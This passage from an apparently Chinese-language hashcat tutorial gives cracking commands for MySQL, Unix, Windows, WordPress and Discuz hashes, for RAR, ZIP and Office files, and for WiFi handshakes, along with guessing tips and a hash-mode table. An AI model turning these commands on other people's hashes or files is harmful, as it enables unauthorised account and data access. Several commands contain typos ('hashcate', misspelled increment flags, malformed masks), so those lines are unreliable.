0 --force 25c3e88f81b4853f2a8faacad4c871b6 ?d?d?d?d?d?d?d`- #### 7位小写字母破解  `hashcat -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 ?l?l?l?l?l?l?l`- #### 1-8位小写字母+数字破解  `hashcat -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 --incement --increment-min 1 --inrement-max 8 h?h?h?h?h??h?h?h`- #### 1-8位为特定字符集：123456abcdf!@+-  `hashcat -a 3 -m 0 --force -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1?1?1`- ####  1-8位数字+大小写字母+可见特殊符号  `hashcat -a 3 -m 0 --force -1 ?d?l?u?s d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1`  or   `hashcat -a 3 -m 0 --force  d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a`- #### 字典破解  `hashcat -a 0 -m 0 --force [hash] password.txt -o ./result`  #### 批量爆破  `hashcat -a 0 -m 0 --force [hashfile] password.txt -o ./result`- #### 字典组合破解  `hashcat -a 1 -m 0 --force [hash] pwd1.txt pwd2.txt`- #### 字典加掩码破解  `hashcat -a 6 9dc9d5ed5031367d42543763423c24ee pwd.txt ?l?l?l?l?l`</code></pre><ul><li><h3 id="密码类型实例"><a href="#密码类型实例" class="headerlink" title="密码类型实例"></a>密码类型实例</h3><ul><li><h4 id="mysql4-1-5-passwod"><a href="#mysql4-1-5-passwod" class="headerlink" title="mysql4.1/5 passwod"></a>mysql4.1/5 passwod</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="sha512crypt-6-SHA512-Unix-破解"><a href="#sha512crypt-6-SHA512-Unix-破解" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)破解"></a>sha512crypt $6$, SHA512 (Unix)破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcate -a 3 -m 1800 --force $6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X. ?l?l?l?l</span></pre></td></tr></table></figure><p>不用整理用户名，使用–username</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 1800 --force qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1 ?l?l?l?l?l --username</span></pre></td></tr></table></figure></li><li><h4 id="Windows-NT-hash，LM-hash破解"><a href="#Windows-NT-hash，LM-hash破解" class="headerlink" title="Windows NT-hash，LM-hash破解"></a>Windows NT-hash，LM-hash破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">NT-hash:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">LM-hash:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</span></pre></td></tr></table></figure></li><li><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="wordpress密码hash破解"><a href="#wordpress密码hash破解" class="headerlink" title="wordpress密码hash破解"></a>wordpress密码hash破解</h4><p> 具体加密脚本在<code>./wp-includes/class-phpass.php</code>的<code>HashPassword</code>函数 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 400 --force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F; ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="discuz用户密码hash破解"><a href="#discuz用户密码hash破解" class="headerlink" title="discuz用户密码hash破解"></a>discuz用户密码hash破解</h4><p> 其密码加密方式md5(md5($pass).$salt) </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="破解RAR压缩密码"><a href="#破解RAR压缩密码" class="headerlink" title="破解RAR压缩密码"></a>破解RAR压缩密码</h4><p> 首先rar2john获取rar文件hash值 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">rar2john.exe 1.rar</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcate -a 3 -m 13000 --force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e ?d?d?d?d?d?d</span></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat 支持 RAR3-hp 和 RAR5，官方示例如下：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-m参数    类型      示例 hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">12500    RAR3-hp    $RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">13000    RAR5       $rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe</span></pre></td></tr></table></figure></li><li><h4 id="zip密码破解"><a href="#zip密码破解" class="headerlink" title="zip密码破解"></a>zip密码破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">zip2john.exe 1.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">结果：1.zip:$zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$&#x2F;zip2$:::::1.zip-1.txt</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 13600 $zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$&#x2F;zip2$ --force ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="破解office密码"><a href="#破解office密码" class="headerlink" title="破解office密码"></a>破解office密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">获取office的hash值：python office2john.py 11.docx</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 9600 $office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 --force ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="破解WIFI密码"><a href="#破解WIFI密码" class="headerlink" title="破解WIFI密码"></a>破解WIFI密码</h4><p>首先先把我们的握手包转化为hccapx格式，现在最新版的hashcat只支持hccapx格式了，以前的hccap格式已经不支持了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">官方在线转化https:&#x2F;&#x2F;hashcat.net&#x2F;cap2hccapx&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</span></pre></td></tr></table></figure></li></ul></li></ul><ul><li><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li><p>对于破解过的hash值，用<code>hashcat64.exe hash --show</code>查看结果</p></li><li><p>所有的hash破解结果都在hashcat.potfile文件中</p></li><li><p>如果破解的时间太长，可以按s键可以查看破解的状态，p键暂停，r键继续破解，q键退出破解。</p></li><li><p>在使用GPU模式进行破解时，可以使用-O参数自动进行优化</p></li><li><p>在实际破解中的建议，如果我们盲目的去破解，会占用我们大量的时间和资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1.首先走一遍常用的弱口令字典</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">2.组合密码，如：zhang1999，用姓氏和出生年组合，当然也可以用其它的组合，这里举个例子而已</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">3.把常用的掩码组合整理起来放在masks中的.hcmask文件中，然后让它自动加载破解</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">4.如果实在不行，你可以尝试低位数的所有组合去跑，不过不建议太高位数的组合去破解，因为如果对方设置的密码很复杂的话，到头来你密码没有破解到，却浪费了大量的时间和资源，得不偿失</span></pre></td></tr></table></figure><p>6.HashCat参数优化<br> 考虑到hashcat的破解速度以及资源的分配，我们可以对一些参数进行配置</p><ol><li>Workload tuning 负载调优。<br> 该参数支持的值有1,8,40,80,160  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">--gpu-accel 160 可以让GPU发挥最大性能。</span></pre></td></tr></table></figure></li><li>Gpu loops 负载微调  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">--gpu-loops 1024 可以让GPU发挥最大性能。</span></pre></td></tr></table></figure></li><li>Segment size 字典缓存大小 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">--segment-size 512 可以提高大字典破解的速度。</span></pre></td></tr></table></figure></li></ol></li></ol></li><li><h3 id="m-参数加密类型"><a href="#m-参数加密类型" class="headerlink" title="m 参数加密类型"></a>m 参数加密类型</h3>  <figure class="highlight plain"><figcaption><span>[ Hash modes ] -</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    # | Name                                             | Category</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  900 | MD4                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    0 | MD5                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"> 5100 | Half MD5                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  100 | SHA1                                             | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"> 1300 | SHA2-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"> 1400 | SHA2-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">10800 | SHA2-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"> 1700 | SHA2-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">17300 | SHA3-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">17400 | SHA3-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">17500 | SHA3-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">17600 | SHA3-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">17700 | Keccak-224                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">17800 | Keccak-256                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">17900 | Keccak-384                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">18000 | Keccak-512                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  600 | BLAKE2b-512                                      | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">10100 | SipHash                                          | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"> 6000 | RIPEMD-160                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"> 6100 | Whirlpool                                        | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"> 6900 | GOST R 34.11-94                                  | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">   10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">   20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">   30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">   40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"> 3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"> 3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"> 4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"> 4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"> 2600 | md5(md5($pass))                                  | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"> 3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line"> 4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"> 4400 | md5(sha1($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">  110 | sha1($pass.$salt)                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">  120 | sha1($salt.$pass)                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">  130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">  140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"> 4500 | sha1(sha1($pass))                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"> 4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line"> 4700 | sha1(md5($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"> 4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">14400 | sha1(CX)                                         | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line"> 1410 | sha256($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"> 1420 | sha256($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line"> 1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line"> 1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line"> 1710 | sha512($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line"> 1720 | sha512($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line"> 1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"> 1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">   50 | HMAC-MD5 (key &#x3D; $pass)                           | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">   60 | HMAC-MD5 (key &#x3D; $salt)                           | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">  150 | HMAC-SHA1 (key &#x3D; $pass)                          | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">  160 | HMAC-SHA1 (key &#x3D; $salt)                          | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line"> 1450 | HMAC-SHA256 (key &#x3D; $pass)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line"> 1460 | HMAC-SHA256 (key &#x3D; $salt)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"> 1750 | HMAC-SHA512 (key &#x3D; $pass)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line"> 1760 | HMAC-SHA512 (key &#x3D; $salt)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">11750 | HMAC-Streebog-256 (key &#x3D; $pass), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">11760 | HMAC-Streebog-256 (key &#x3D; $salt), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">11850 | HMAC-Streebog-512 (key &#x3D; $pass), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">11860 | HMAC-Streebog-512 (key &#x3D; $salt), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">14000 | DES (PT &#x3D; $salt, key &#x3D; $pass)                    | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">14100 | 3DES (PT &#x3D; $salt, key &#x3D; $pass)                   | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">14900 | Skip32 (PT &#x3D; $salt, key &#x3D; $pass)                 | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">  400 | phpass                                           | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line"> 8900 | scrypt                                           | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">11900 | PBKDF2-HMAC-MD5                                  | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">10900 | PBKDF2-HMAC-SHA256                               | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">12100 | PBKDF2-HMAC-SHA512                               | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">   23 | Skype                                            | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line"> 2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line"> 2501 | WPA-EAPOL-PMK                                    | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">16800 | WPA-PMKID-PBKDF2                                 | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">16801 | WPA-PMKID-PMK                                    | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line"> 4800 | iSCSI CHAP authentication, MD5(CHAP)             | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line"> 5300 | IKE-PSK MD5                                      | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line"> 5400 | IKE-PSK SHA1                                     | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line"> 5500 | NetNTLMv1                                        | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line"> 5500 | NetNTLMv1+ESS                                    | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"> 5600 | NetNTLMv2                                        | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line"> 7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line"> 7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line"> 8300 | DNSSEC (NSEC3)                                   | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">10200 | CRAM-MD5                                         | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">11100 | PostgreSQL CRAM (MD5)                            | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">11200 | MySQL CRAM (SHA1)                                | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">11400 | SIP digest authentication (MD5)                  | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">16100 | TACACS+                                          | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">16500 | JWT (JSON Web Token)                             | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">  121 | SMF (Simple Machines Forum) &gt; v1.1               | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line">  400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span 